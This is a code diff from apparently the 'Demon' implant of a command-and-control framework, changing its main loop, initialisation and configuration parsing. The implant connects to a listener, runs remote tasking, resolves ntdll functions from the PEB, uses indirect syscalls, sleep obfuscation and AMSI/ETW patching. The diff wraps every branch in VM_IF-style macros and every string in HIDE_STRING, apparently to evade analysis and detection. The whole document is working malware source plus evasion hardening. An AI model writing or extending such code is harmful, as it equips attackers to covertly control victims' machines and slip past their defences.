@@ -67,10 +67,10 @@ VOID DemonRoutine()
     for ( ;; )
     {
         /* if we aren't connected then lets connect to our host */
-        if ( ! Instance->Session.Connected )
+        VM_IF (!Instance->Session.Connected)
         {
             /* Connect to our listener */
-            if ( TransportInit() )
+            VM_IF (TransportInit())
             {
 
 #ifdef TRANSPORT_HTTP
@@ -80,7 +80,7 @@ VOID DemonRoutine()
             }
         }
 
-        if ( Instance->Session.Connected )
+        VM_IF (Instance->Session.Connected)
         {
             /* Enter tasking routine */
             CommandDispatcher();
@@ -287,16 +287,16 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     Instance->Teb = NtCurrentTeb();
 
 #ifdef TRANSPORT_HTTP
-    PUTS( "TRANSPORT_HTTP" )
+    PUTS( HIDE_STRING("TRANSPORT_HTTP") )
 #endif
 
 #ifdef TRANSPORT_SMB
-    PUTS( "TRANSPORT_SMB" )
+    PUTS( HIDE_STRING("TRANSPORT_SMB") )
 #endif
 
 
     /* resolve ntdll.dll functions */
-    if ( ( Instance->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
+    VM_IF ( ( Instance->Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
         /* Module/Address function loading */
         Instance->Win32.LdrGetProcedureAddress            = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRGETPROCEDUREADDRESS );
         Instance->Win32.LdrLoadDll                        = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_LDRLOADDLL );
@@ -360,37 +360,37 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance->Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
         Instance->Win32.NtQueryObject                     = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
         Instance->Win32.NtTraceEvent                      = LdrFunctionAddr( Instance->Modules.Ntdll, H_FUNC_NTTRACEEVENT );
-    } else {
-        PUTS( "Failed to load ntdll from PEB" )
+    } VM_ELSE {
+        PUTS( HIDE_STRING("Failed to load ntdll from PEB") )
         return;
     }
 
     /* resolve Windows version */
     Instance->Session.OSVersion = WIN_VERSION_UNKNOWN;
     OSVersionExW.dwOSVersionInfoSize = sizeof( OSVersionExW );
-    if ( NT_SUCCESS( Instance->Win32.RtlGetVersion( &OSVersionExW ) ) ) {
-        if ( OSVersionExW.dwMajorVersion >= 5 ) {
-            if ( OSVersionExW.dwMajorVersion == 5 ) {
-                if ( OSVersionExW.dwMinorVersion == 1 ) {
+    VM_IF ( NT_SUCCESS( Instance->Win32.RtlGetVersion( &OSVersionExW ) ) ) {
+        VM_IF ( VM_GEQ(OSVersionExW.dwMajorVersion, 5) ) {
+            VM_IF ( VM_EQU(OSVersionExW.dwMajorVersion, 5) ) {
+                VM_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 1) ) {
                     Instance->Session.OSVersion = WIN_VERSION_XP;
                 }
-            } else if ( OSVersionExW.dwMajorVersion == 6 ) {
-                if ( OSVersionExW.dwMinorVersion == 0 ) {
+            } VM_ELSE_IF ( VM_EQU(OSVersionExW.dwMajorVersion, 6) ) {
+                VM_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 0) ) {
                     Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_VISTA : WIN_VERSION_2008;
-                } else if ( OSVersionExW.dwMinorVersion == 1 ) {
+                } VM_ELSE_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 1) ) {
                     Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_7 : WIN_VERSION_2008_R2;
-                } else if ( OSVersionExW.dwMinorVersion == 2 ) {
+                } VM_ELSE_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 2) ) {
                     Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8 : WIN_VERSION_2012;
-                } else if ( OSVersionExW.dwMinorVersion == 3 ) {
+                } VM_ELSE_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 3) ) {
                     Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_8_1 : WIN_VERSION_2012_R2;
                 }
-            } else if ( OSVersionExW.dwMajorVersion == 10 ) {
-                if ( OSVersionExW.dwMinorVersion == 0 ) {
+            } VM_ELSE_IF ( VM_EQU(OSVersionExW.dwMajorVersion, 10) ) {
+                VM_IF ( VM_EQU(OSVersionExW.dwMinorVersion, 0) ) {
                     Instance->Session.OSVersion = OSVersionExW.wProductType == VER_NT_WORKSTATION ? WIN_VERSION_10 : WIN_VERSION_2016_X;
                 }
             }
         }
-    } PRINTF( "OSVersion: %d\n", Instance->Session.OSVersion );
+    } PRINTF( HIDE_STRING("OSVersion: %d\n"), Instance->Session.OSVersion );
 
     /* load kernel32.dll functions */
     if ( ( Instance->Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
@@ -467,7 +467,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     {
         /* Initialize indirect syscalls + get SSN from every single syscall we need */
         if  ( ! SysInitialize( Instance->Modules.Ntdll ) ) {
-            PUTS( "Failed to Initialize syscalls" )
+            PUTS( HIDE_STRING("Failed to Initialize syscalls") )
             /* NOTE: the agent is going to keep going for now. */
         }
     }
@@ -480,7 +480,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
     {
         /* load module */
         if ( ! ( ( BOOL (*)() ) RtModules[ i ] ) () ) {
-            PUTS( "Failed to load a module" )
+            PUTS( HIDE_STRING("Failed to load a module") )
             return;
         }
     }
@@ -547,7 +547,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
      * to not raise an exception while performing sleep obfuscation */
     if ( CfgQueryEnforced() )
     {
-        PUTS( "Adding required function module &addresses to the cfg list"  );
+        PUTS( HIDE_STRING("Adding required function module &addresses to the cfg list")  );
 
         /* common functions */
         CfgAddressAdd( Instance->Modules.Ntdll,    Instance->Win32.NtContinue );
@@ -567,7 +567,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         CfgAddressAdd( Instance->Modules.Ntdll, Instance->Win32.RtlExitUserThread );
     }
 
-    PRINTF( "Instance DemonID => %x\n", Instance->Session.AgentID )
+    PRINTF( HIDE_STRING("Instance DemonID => %x\n"), Instance->Session.AgentID )
 }
 
 VOID DemonConfig()
@@ -578,22 +578,22 @@ VOID DemonConfig()
     UINT32 Length = 0;
     DWORD  J      = 0;
 
-    PRINTF( "Config Size: %d\n", sizeof( AgentConfig ) )
+    PRINTF( HIDE_STRING("Config Size: %d\n"), sizeof( AgentConfig ) )
 
     ParserNew( &Parser, AgentConfig, sizeof( AgentConfig ) );
     RtlSecureZeroMemory( AgentConfig, sizeof( AgentConfig ) );
 
     Instance->Config.Sleeping = ParserGetInt32( &Parser );
     Instance->Config.Jitter   = ParserGetInt32( &Parser );
-    PRINTF( "Sleep: %d (%d%%)\n", Instance->Config.Sleeping, Instance->Config.Jitter )
+    PRINTF( HIDE_STRING("Sleep: %d (%d%%)\n"), Instance->Config.Sleeping, Instance->Config.Jitter )
 
     Instance->Config.Memory.Alloc   = ParserGetInt32( &Parser );
     Instance->Config.Memory.Execute = ParserGetInt32( &Parser );
 
     PRINTF(
-        "[CONFIG] Memory: \n"
+        HIDE_STRING("[CONFIG] Memory: \n"
         " - Allocate: %d  \n"
-        " - Execute : %d  \n",
+        " - Execute : %d  \n"),
         Instance->Config.Memory.Alloc,
         Instance->Config.Memory.Execute
     )
@@ -607,9 +607,9 @@ VOID DemonConfig()
     MemCopy( Instance->Config.Process.Spawn86, Buffer, Length );
 
     PRINTF(
-        "[CONFIG] Spawn: \n"
+        HIDE_STRING("[CONFIG] Spawn: \n"
         " - [x64] => %ls  \n"
-        " - [x86] => %ls  \n",
+        " - [x86] => %ls  \n"),
         Instance->Config.Process.Spawn64,
         Instance->Config.Process.Spawn86
     )
@@ -627,22 +627,22 @@ VOID DemonConfig()
 #endif
 
     PRINTF(
-        "[CONFIG] Sleep Obfuscation: \n"
+        HIDE_STRING("[CONFIG] Sleep Obfuscation: \n"
         " - Technique: %d \n"
         " - Stack Dup: %s \n"
         "[CONFIG] ProxyLoading: %d\n"
         "[CONFIG] SysIndirect : %s\n"
-        "[CONFIG] AmsiEtwPatch: %d\n",
+        "[CONFIG] AmsiEtwPatch: %d\n"),
         Instance->Config.Implant.SleepMaskTechnique,
-        Instance->Config.Implant.StackSpoof ? "TRUE" : "FALSE",
+        Instance->Config.Implant.StackSpoof ? HIDE_STRING("TRUE") : HIDE_STRING("FALSE"),
         Instance->Config.Implant.ProxyLoading,
-        Instance->Config.Implant.SysIndirect ? "TRUE" : "FALSE",
+        Instance->Config.Implant.SysIndirect ? HIDE_STRING("TRUE") : HIDE_STRING("FALSE"),
         Instance->Config.Implant.AmsiEtwPatch
     )
 
 #ifdef TRANSPORT_HTTP
     Instance->Config.Transport.KillDate       = ParserGetInt64( &Parser );
-    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+    PRINTF( HIDE_STRING("KillDate: %d\n"), Instance->Config.Transport.KillDate )
     // check if the kill date has already passed
     if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
     {
@@ -664,13 +664,13 @@ VOID DemonConfig()
 
     /* J contains our Hosts counter */
     J = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Hosts [%d]\n:", J )
+    PRINTF( HIDE_STRING("[CONFIG] Hosts [%d]\n:"), J )
     for ( int i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
         Temp   = ParserGetInt32( &Parser );
 
-        PRINTF( " - %ls:%ld\n", Buffer, Temp )
+        PRINTF( HIDE_STRING(" - %ls:%ld\n"), Buffer, Temp )
 
         /* if our host address is longer than 0 then lets use it. */
         if ( Length > 0 ) {
@@ -679,26 +679,26 @@ VOID DemonConfig()
         }
     }
     Instance->Config.Transport.NumHosts = HostCount();
-    PRINTF( "Hosts added => %d\n", Instance->Config.Transport.NumHosts )
+    PRINTF( HIDE_STRING("Hosts added => %d\n"), Instance->Config.Transport.NumHosts )
 
     /* Get Host data based on our host rotation strategy */
     Instance->Config.Transport.Host = HostRotation( Instance->Config.Transport.HostRotation );
-    PRINTF( "Host going to be used is => %ls:%ld\n", Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port )
+    PRINTF( HIDE_STRING("Host going to be used is => %ls:%ld\n"), Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port )
 
     // Listener Secure (SSL)
     Instance->Config.Transport.Secure = ParserGetInt32( &Parser );
-    PRINTF( "[CONFIG] Secure: %s\n", Instance->Config.Transport.Secure ? "TRUE" : "FALSE" );
+    PRINTF( HIDE_STRING("[CONFIG] Secure: %s\n"), Instance->Config.Transport.Secure ? HIDE_STRING("TRUE") : HIDE_STRING("FALSE") );
 
     // UserAgent
     Buffer = ParserGetBytes( &Parser, &Length );
     Instance->Config.Transport.UserAgent = MmHeapAlloc( Length + sizeof( WCHAR ) );
     MemCopy( Instance->Config.Transport.UserAgent, Buffer, Length );
-    PRINTF( "[CONFIG] UserAgent: %ls\n", Instance->Config.Transport.UserAgent );
+    PRINTF( HIDE_STRING("[CONFIG] UserAgent: %ls\n"), Instance->Config.Transport.UserAgent );
 
     // Headers
     J = ParserGetInt32( &Parser );
     Instance->Config.Transport.Headers = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
-    PRINTF( "[CONFIG] Headers [%d]:\n", J );
+    PRINTF( HIDE_STRING("[CONFIG] Headers [%d]:\n"), J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
@@ -706,7 +706,7 @@ VOID DemonConfig()
         MemSet( Instance->Config.Transport.Headers[ i ], 0, Length );
         MemCopy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
 #ifdef DEBUG
-        PRINTF( "  - %ls\n", Instance->Config.Transport.Headers[ i ] );
+        PRINTF( HIDE_STRING("  - %ls\n"), Instance->Config.Transport.Headers[ i ] );
 #endif
     }
     Instance->Config.Transport.Headers[ J + 1 ] = NULL;
@@ -714,7 +714,7 @@ VOID DemonConfig()
     // Uris
     J = ParserGetInt32( &Parser );
     Instance->Config.Transport.Uris = MmHeapAlloc( sizeof( LPWSTR ) * ( ( J + 1 ) * 2 ) );
-    PRINTF( "[CONFIG] Uris [%d]:\n", J );
+    PRINTF( HIDE_STRING("[CONFIG] Uris [%d]:\n"), J );
     for ( INT i = 0; i < J; i++ )
     {
         Buffer = ParserGetBytes( &Parser, &Length );
@@ -722,7 +722,7 @@ VOID DemonConfig()
         MemSet( Instance->Config.Transport.Uris[ i ], 0, Length + sizeof( WCHAR ) );
         MemCopy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
 #ifdef DEBUG
-        PRINTF( "  - %ls\n", Instance->Config.Transport.Uris[ i ] );
+        PRINTF( HIDE_STRING("  - %ls\n"), Instance->Config.Transport.Uris[ i ] );
 #endif
     }
     Instance->Config.Transport.Uris[ J + 1 ] = NULL;
@@ -731,18 +731,18 @@ VOID DemonConfig()
     Instance->Config.Transport.Proxy.Enabled = ( BOOL ) ParserGetInt32( &Parser );;
     if ( Instance->Config.Transport.Proxy.Enabled )
     {
-        PUTS( "[CONFIG] [PROXY] Enabled" );
+        PUTS( HIDE_STRING("[CONFIG] [PROXY] Enabled") );
         Buffer = ParserGetBytes( &Parser, &Length );
         Instance->Config.Transport.Proxy.Url = MmHeapAlloc( Length + sizeof( WCHAR ) );
         MemCopy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
-        PRINTF( "[CONFIG] [PROXY] Url: %ls\n", Instance->Config.Transport.Proxy.Url );
+        PRINTF( HIDE_STRING("[CONFIG] [PROXY] Url: %ls\n"), Instance->Config.Transport.Proxy.Url );
 
         Buffer = ParserGetBytes( &Parser, &Length );
         if ( Length > 0 )
         {
             Instance->Config.Transport.Proxy.Username = MmHeapAlloc( Length );
             MemCopy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
-            PRINTF( "[CONFIG] [PROXY] Username: %ls\n", Instance->Config.Transport.Proxy.Username );
+            PRINTF( HIDE_STRING("[CONFIG] [PROXY] Username: %ls\n"), Instance->Config.Transport.Proxy.Username );
         }
         else
             Instance->Config.Transport.Proxy.Username = NULL;
@@ -752,14 +752,14 @@ VOID DemonConfig()
         {
             Instance->Config.Transport.Proxy.Password = MmHeapAlloc( Length );
             MemCopy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
-            PRINTF( "[CONFIG] [PROXY] Password: %ls\n", Instance->Config.Transport.Proxy.Password );
+            PRINTF( HIDE_STRING("[CONFIG] [PROXY] Password: %ls\n"), Instance->Config.Transport.Proxy.Password );
         }
         else
             Instance->Config.Transport.Proxy.Password = NULL;
     }
     else
     {
-        PUTS( "[CONFIG] [PROXY] Disabled" );
+        PUTS( HIDE_STRING("[CONFIG] [PROXY] Disabled") );
     }
 #endif
 
@@ -769,10 +769,10 @@ VOID DemonConfig()
     Instance->Config.Transport.Name = Instance->Win32.LocalAlloc( LPTR, Length );
     MemCopy( Instance->Config.Transport.Name, Buffer, Length );
 
-    PRINTF( "[CONFIG] PipeName: %ls\n", Instance->Config.Transport.Name );
+    PRINTF( HIDE_STRING("[CONFIG] PipeName: %ls\n"), Instance->Config.Transport.Name );
 
     Instance->Config.Transport.KillDate = ParserGetInt64( &Parser );
-    PRINTF( "KillDate: %d\n", Instance->Config.Transport.KillDate )
+    PRINTF( HIDE_STRING("KillDate: %d\n"), Instance->Config.Transport.KillDate )
     // check if the kill date has already passed
     if ( Instance->Config.Transport.KillDate && GetSystemFileTime() >= Instance->Config.Transport.KillDate )
     {
